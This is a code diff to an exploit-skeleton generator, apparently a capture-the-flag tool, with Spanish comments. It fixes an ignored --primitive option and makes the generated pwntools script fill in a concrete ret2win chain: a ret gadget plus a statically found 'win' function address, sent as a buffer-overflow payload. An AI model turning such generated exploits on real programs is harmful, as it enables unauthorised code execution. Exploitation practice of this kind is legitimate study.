@@ -23,6 +23,16 @@ def _pwn_arch(arch: str, bits: str) -> str:
     return "amd64" if bits == "64" else "i386"
 
 
+def _find_win_address(binary: str) -> Optional[int]:
+    """Busqueda estatica (sin sandbox) de una funcion 'regalo' (win/shell/flag...) -- reusa
+    autopoc.find_win en vez de reinventarla. None si no se encuentra ninguna."""
+    try:
+        from .autopoc import find_win
+        return find_win(binary)
+    except Exception:
+        return None
+
+
 def generate_skeleton(registry: ToolRegistry, binary: str,
                       offset: Optional[int] = None, primitive: str = "auto") -> str:
     checksec = registry.get("r2_checksec")
@@ -49,6 +59,23 @@ def generate_skeleton(registry: ToolRegistry, binary: str,
     else:
         notes.append("# NX on: no stack shellcode -> ROP / ret2libc")
     notes_block = "\n".join(notes) if notes else "# (no special mitigations detected)"
+
+    # Bug real encontrado en vivo: `primitive` se aceptaba como parametro (y como flag --primitive
+    # de la CLI, documentado) pero nunca se usaba en el cuerpo -- --primitive ret2win generaba
+    # BYTE A BYTE el mismo script que --primitive auto, con el placeholder generico de siempre,
+    # pese a que ese mismo placeholder ya sugiere "ret2win: elf.symbols['win']" como si debiera
+    # rellenarse solo. Cuando el primitivo (explicito o 'auto') es ret2win y hay una funcion
+    # 'regalo' localizable estaticamente, se rellena un ret2win concreto; si no, cae al
+    # placeholder generico de siempre (comportamiento sin cambios para el resto de casos).
+    win_addr = _find_win_address(binary) if primitive in ("ret2win", "auto") else None
+    if win_addr is not None:
+        pre_payload = "    ret_gadget = next(elf.search(asm('ret'), executable=True), 0)  # 16B align\n"
+        chain_items = f"            ret_gadget, {hex(win_addr)},  # ret2win: found statically ({hex(win_addr)})\n"
+    else:
+        pre_payload = ""
+        chain_items = ("            # >>> build your chain here <<<\n"
+                       "            # ret2win:   elf.symbols['win']\n"
+                       "            # ret2libc:  rop = ROP(elf); rop.raw(rop.find_gadget(['ret'])); ...\n")
 
     return f'''#!/usr/bin/env python3
 # binoracle-generated exploit skeleton
@@ -84,12 +111,9 @@ def find_offset():
 def exploit():
     io = start()
     assert OFFSET is not None, "set OFFSET first (run find_offset)"
-    payload = flat({{
+{pre_payload}    payload = flat({{
         OFFSET: [
-            # >>> build your chain here <<<
-            # ret2win:   elf.symbols['win']
-            # ret2libc:  rop = ROP(elf); rop.raw(rop.find_gadget(['ret'])); ...
-        ]
+{chain_items}        ]
     }})
     io.sendline(payload)
     io.interactive()
